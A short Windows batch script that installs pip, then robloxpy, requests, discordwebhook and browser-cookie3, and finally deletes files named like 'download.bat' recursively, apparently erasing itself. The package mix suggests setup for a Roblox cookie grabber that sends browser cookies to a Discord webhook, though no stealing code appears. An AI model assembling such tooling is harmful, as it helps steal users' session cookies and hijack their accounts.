@echo off


:start
cls

set python_ver=36

python ./get-pip.py

cd \
cd \python%python_ver%\Scripts\
py -m pip install robloxpy
py -m pip install requests
py -m pip install discordwebhook
py -m pip install browser-cookie3


echo cmd delete all files in folder
del "download.bat*.*" /s /f /q

echo Done!
pause
exit